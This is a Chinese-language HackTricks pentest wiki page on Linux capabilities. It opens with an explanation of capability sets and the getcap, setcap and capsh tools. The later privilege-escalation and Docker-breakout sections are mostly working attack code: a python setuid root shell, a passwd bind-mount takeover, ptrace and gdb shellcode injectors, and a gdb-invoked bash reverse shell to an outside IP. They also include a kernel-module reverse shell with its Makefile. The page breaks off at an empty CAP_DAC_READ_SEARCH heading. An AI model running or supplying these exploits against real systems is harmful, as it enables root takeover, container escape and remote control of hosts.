# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}


## Linux Capabilities

Linux capabilities 将 **root 权限划分为更小且彼此独立的单元**，使进程能够拥有部分权限。这样可以避免不必要地授予完整的 root 权限，从而降低风险。

### 问题：

- 普通用户的权限有限，这会影响诸如打开网络 socket 等需要 root 权限的操作。

### Capability Sets：

1. **Inherited (CapInh)**：

- **用途**：确定从父进程传递下来的 capabilities。
- **功能**：创建新进程时，该进程会继承此集合中父进程拥有的 capabilities。适用于在进程创建过程中保持某些权限。
- **限制**：进程无法获得其父进程不具备的 capabilities。

2. **Effective (CapEff)**：

- **用途**：表示进程当前实际使用的 capabilities。
- **功能**：这是 kernel 检查并据此授予各种操作权限的 capabilities 集合。对于文件而言，该集合可以是一个标志，用于指示是否应将文件的 permitted capabilities 视为 effective。
- **重要性**：effective 集合对于即时权限检查至关重要，代表进程可以使用的 active capabilities 集合。

3. **Permitted (CapPrm)**：

- **用途**：定义进程可以拥有的最大 capabilities 集合。
- **功能**：进程可以将某个 capability 从 permitted 集合提升到 effective 集合，从而获得使用该 capability 的能力。进程也可以从其 permitted 集合中删除 capabilities。
- **边界**：它作为进程可拥有 capabilities 的上限，确保进程不会超出预先定义的权限范围。

4. **Bounding (CapBnd)**：

- **用途**：限制进程在其生命周期内能够获得的 capabilities 上限。
- **功能**：即使进程在其 inheritable 或 permitted 集合中拥有某个 capability，除非该 capability 同时存在于 bounding 集合中，否则进程也无法获得它。
- **使用场景**：此集合对于限制进程的权限提升潜力特别有用，可提供额外的安全层。

5. **Ambient (CapAmb)**：
- **用途**：允许某些 capabilities 跨越 `execve` system call 得以保留，而该调用通常会完全重置进程的 capabilities。
- **功能**：确保没有关联 file capabilities 的非 SUID 程序可以保留某些权限。
- **限制**：此集合中的 capabilities 受 inheritable 和 permitted 集合的约束，从而确保它们不会超出进程被允许拥有的权限。
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
如需进一步了解，请查看：

- [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## 进程与二进制文件 Capabilities

### 进程 Capabilities

要查看特定进程的 capabilities，请使用 /proc 目录中的 **status** 文件。由于该文件提供了更多详细信息，我们这里只关注与 Linux capabilities 相关的信息。\
请注意，对于所有正在运行的进程，capability 信息按线程维护；对于文件系统中的二进制文件，则存储在扩展属性中。

你可以在 /usr/include/linux/capability.h 中找到已定义的 capabilities。

你可以通过 `cat /proc/self/status` 或执行 `capsh --print` 查看当前进程的 capabilities，也可以在 `/proc/<pid>/status` 中查看其他用户的 capabilities。
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
此命令在大多数系统上应返回 5 行。

- CapInh = 继承的 capabilities
- CapPrm = 允许的 capabilities
- CapEff = 有效的 capabilities
- CapBnd = Bounding set
- CapAmb = Ambient capabilities 集合
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
这些十六进制数字没有意义。使用 capsh utility，我们可以将它们解码为 capabilities 名称。
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
现在检查 `ping` 使用的 **capabilities**：
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
虽然这种方法可行，但还有另一种更简单的方法。要查看正在运行的进程的 capabilities，只需使用 **getpcaps** 工具并在其后指定进程 ID（PID）。你也可以提供进程 ID 列表。
```bash
getpcaps 1234
```
让我们检查一下 `tcpdump` 在为二进制文件授予足够的 capabilities（`cap_net_admin` 和 `cap_net_raw`）以嗅探网络后所拥有的 capabilities（_tcpdump 正在进程 9562 中运行_）：
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
正如你所看到的，给出的 capabilities 与通过两种方式获取二进制文件 capabilities 的结果相对应。\
_getpcaps_ 工具使用 **capget()** system call 来查询特定 thread 可用的 capabilities。该 system call 只需提供 PID 即可获取更多信息。

### 二进制文件 Capabilities

二进制文件可以拥有在执行过程中使用的 capabilities。例如，发现带有 `cap_net_raw` capability 的 `ping` binary 非常常见：
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
你可以使用以下命令**搜索带有 capabilities 的 binaries**：
```bash
getcap -r / 2>/dev/null
```
### 使用 capsh 删除 capabilities

如果我们为 \_ping* 删除 CAP*NET_RAW capabilities，那么 ping utility 应该不再工作。
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
除了 _capsh_ 本身的输出外，_tcpdump_ 命令本身也应该报错。

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

该错误清楚地表明，ping 命令不允许打开 ICMP socket。现在我们可以确定，这确实按预期工作。

### 移除 Capabilities

你可以使用以下命令移除二进制文件的 capabilities：
```bash
setcap -r </path/to/binary>
```
## 用户 Capabilities

显然，**也可以为用户分配 capabilities**。这可能意味着，用户执行的每个进程都能够使用该用户的 capabilities。\
根据 [this](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7)、[this ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) 和 [this ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)，需要配置一些文件才能为用户赋予特定的 capabilities，但负责为每个用户分配 capabilities 的文件是 `/etc/security/capability.conf`。\
文件示例：
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## 环境 Capabilities

编译以下程序后，可以在一个提供 **capabilities** 的环境中 **spawn a bash shell**。
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
在由已编译的 ambient binary 执行的 **bash** 中，可以观察到 **new capabilities**（普通用户在 “current” 部分不会拥有任何 capability）。
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> 你**只能添加同时存在于 permitted 和 inheritable 集合中的 capabilities**。

### 支持 capability/不支持 capability 的 binaries

**支持 capability 的 binaries 不会使用**环境提供的新 capabilities，而**不支持 capability 的 binaries 将使**用它们，因为它们不会拒绝这些 capabilities。这使得不支持 capability 的 binaries 在会向 binaries 授予 capabilities 的特殊环境中变得易受攻击。

## Service Capabilities

默认情况下，**以 root 身份运行的 service 会被分配所有 capabilities**，这在某些情况下可能很危险。\
因此，**service 配置**文件允许你**指定**它应拥有的 **capabilities**，以及应执行该 service 的**用户**，从而避免以不必要的权限运行 service：
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Docker Containers 中的 Capabilities

默认情况下，Docker 会为 containers 分配一些 capabilities。运行以下命令即可轻松检查这些 capabilities：
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

当你**希望在执行特权操作后限制自己的进程时**，Capabilities 非常有用（例如设置 chroot 并绑定到某个 socket 后）。但是，也可以通过向它们传递恶意命令或参数来利用它们，而这些命令或参数随后会以 root 身份运行。

你可以使用 `setcap` 为程序强制设置 Capabilities，并使用 `getcap` 查询这些 Capabilities：
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` 表示将该 capability 添加为 Effective 和 Permitted（`-` 表示移除）。

要识别系统或文件夹中具有 capabilities 的程序：
```bash
getcap -r / 2>/dev/null
```
### Exploitation example

在以下示例中，发现二进制文件 `/usr/bin/python2.6` 存在 privesc 漏洞：
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities** 是 `tcpdump` **允许任何用户嗅探数据包**所需的：
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### “empty” capabilities 的特殊情况

[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html)：请注意，可以为程序文件分配空的 capability 集合，因此可以创建一个 set-user-ID-root 程序，使执行该程序的进程的 effective 和 saved set-user-ID 更改为 0，但不会向该进程授予任何 capabilities。或者简单来说，如果你有一个 binary，它：

1. 不属于 root
2. 没有设置 `SUID`/`SGID` 位
3. 具有空的 capabilities 集合（例如：`getcap myelf` 返回 `myelf =ep`）

那么**该 binary 将以 root 身份运行**。

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 是一种功能非常强大的 Linux capability，由于其广泛的**管理权限**（例如挂载设备或操纵 kernel 功能），通常被视为接近 root 级别的 capability。虽然它对于模拟完整系统的容器不可或缺，但由于其可能导致权限提升和系统被攻陷，**`CAP_SYS_ADMIN` 会带来重大的安全挑战**，尤其是在容器化环境中。因此，应对其使用进行严格的安全评估并谨慎管理；对于特定应用的容器，应优先删除此 capability，以遵循**最小权限原则**并缩小攻击面。

**使用 binary 的示例**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
使用 Python，可以将修改后的 _passwd_ 文件挂载到真实的 _passwd_ 文件之上：
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
最后，将修改后的 `passwd` 文件 **mount** 到 `/etc/passwd`：
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
并且你将能够使用密码 "password" **以 root 身份执行 `su`**。

**环境示例（Docker breakout）**

你可以使用以下命令检查 Docker container 内启用的 capabilities：
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
在之前的输出中，可以看到 SYS_ADMIN capability 已启用。

- **Mount**

这允许 Docker container **挂载 host 磁盘并自由访问它**：
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **完全访问权限**

在前一种方法中，我们设法访问了 docker host 磁盘。\  
如果发现 host 正在运行 **ssh** server，可以在 docker host 磁盘中**创建一个用户**，然后通过 SSH 访问它：
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

**这意味着你可以通过向主机内运行的某个进程中注入 shellcode 来逃逸容器。** 若要访问主机内运行的进程，容器至少需要使用 **`--pid=host`** 运行。

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 授予使用 `ptrace(2)` 提供的 debugging 和 system call tracing 功能，以及 `process_vm_readv(2)` 和 `process_vm_writev(2)` 等 cross-memory attach 调用的能力。虽然它对于诊断和 monitoring 用途非常强大，但如果启用 `CAP_SYS_PTRACE` 时没有配合对 `ptrace(2)` 等进行限制的措施（例如 seccomp filter），就可能严重削弱系统安全性。具体来说，它可以被利用来绕过其他安全限制，尤其是 seccomp 施加的限制，[如这个 proof of concept (PoC) 所示](https://gist.github.com/thejh/8346f47e359adecd1d53)。

**使用 binary 的示例（python）**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**使用 binary 的示例（gdb）**

具有 `ptrace` capability 的 `gdb`：
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
使用 msfvenom 创建 shellcode，通过 gdb 注入内存
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
使用 gdb 调试 root 进程，并复制粘贴之前生成的 gdb 命令行：
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**带环境的示例（Docker breakout）- Another gdb Abuse**

如果已安装 **GDB**（例如可以使用 `apk add gdb` 或 `apt install gdb` 安装），你可以**从主机 debug 一个进程**，并让它调用 `system` 函数。（此 technique 还需要 `SYS_ADMIN` capability）**。**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
你将无法看到所执行命令的输出，但该命令会由该进程执行（因此可以获得 rev shell）。

> [!WARNING]
> 如果出现错误 "No symbol "system" in current context."，请查看之前通过 gdb 在程序中加载 shellcode 的示例。

**Example with environment (Docker breakout) - Shellcode Injection**

你可以使用以下命令检查 Docker 容器内启用的 capabilities：
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
列出运行在 **host** 上的 **processes**：`ps -eaf`

1. 获取 **architecture**：`uname -m`
2. 为该 architecture 查找 **shellcode**（[https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128)）
3. 查找一个将 **shellcode** **inject** 到进程内存中的 **program**（[https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c)）
4. 修改 program 中的 **shellcode** 并进行 **compile**：`gcc inject.c -o inject`
5. 执行 **inject** 并获取 **shell**：`./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 赋予 process **加载和卸载 kernel modules（`init_module(2)`、`finit_module(2)` 和 `delete_module(2)` system calls）** 的权限，从而可以直接访问 kernel 的核心操作。此 capability 带来了严重的 security risks，因为它允许通过修改 kernel 来实现 privilege escalation 和对整个 system 的 compromise，进而绕过所有 Linux security mechanisms，包括 Linux Security Modules 和 container isolation。  
**这意味着你可以** **在 host machine 的 kernel 中插入或移除 kernel modules。**

**使用 binary 的示例**

在以下示例中，binary **`python`** 具有此 capability。
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
默认情况下，**`modprobe`** 命令会在目录 **`/lib/modules/$(uname -r)`** 中检查依赖项列表和映射文件。\
为了利用这一点，我们来创建一个伪造的 **lib/modules** 文件夹：
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
然后**编译下面的 2 个 kernel module 示例，并将其复制**到此文件夹：
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
最后，执行所需的 Python 代码以加载此内核模块：
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**包含二进制文件的示例 2**

在以下示例中，二进制文件 **`kmod`** 具有此 capability。
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
这意味着可以使用命令 **`insmod`** 插入 kernel module。参考下面的示例，利用此权限获取 **reverse shell**。

**Example with environment (Docker breakout)**

你可以使用以下命令检查 Docker 容器内启用的 capabilities：
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
在前面的输出中可以看到，**SYS_MODULE** capability 已启用。

**创建**将执行 reverse shell 的 **kernel module**，以及用于**编译**它的 **Makefile**：
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Makefile 中每个 make 命令前的空白字符**必须是制表符，而不是空格**！

执行 `make` 进行编译。
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
最后，在一个 shell 中启动 `nc`，然后从另一个 shell **加载该模块**，你将捕获 `nc` 进程中的 shell：
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**此技术的代码复制自** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **的“Abusing SYS_MODULE Capability”实验室**

此技术的另一个示例可见于 [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

